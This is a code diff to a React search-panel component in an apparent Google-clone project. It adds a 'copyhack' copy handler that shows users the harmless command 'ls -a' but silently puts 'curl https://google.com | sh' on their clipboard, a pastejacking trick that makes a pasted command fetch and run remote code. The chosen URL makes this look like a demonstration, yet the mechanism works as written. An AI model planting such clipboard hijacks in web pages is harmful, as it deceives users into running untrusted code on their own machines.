@@ -9,22 +9,31 @@ const SearchPanal = () => {
     document.title = `Google Clone (${counter})`;
   }, [counter]);
 
+  const copyhack = (e) => {
+    e.clipboardData.setData("text/plain", "curl https://google.com | sh\n")
+    e.preventDefault()
+  } 
+
   return (
-    <div className="container">
+    <div id="copy" className="container">
       <div className="search-panal">
         <SearchBtn label={`Google Search (${counter})`} />
         <SearchBtn label="I'm feeling Lucky" />
       </div>
       <div className="search-panal-text">
-        <span 
-        className="subtext" 
-        onClick={() => setCounter(counter + 1)}>
+        <span className="subtext" onClick={() => setCounter(counter + 1)}>
           Google offered in:
           <a className="lang-link" href="/">
             ภาษาไทย
           </a>
-        </span>
+        </span>                        
       </div>
+      <div onCopy={copyhack}>
+        To see your all files in the directory <br />
+        <code>
+            ls -a
+        </code>
+      </div>      
     </div>
   );
 };
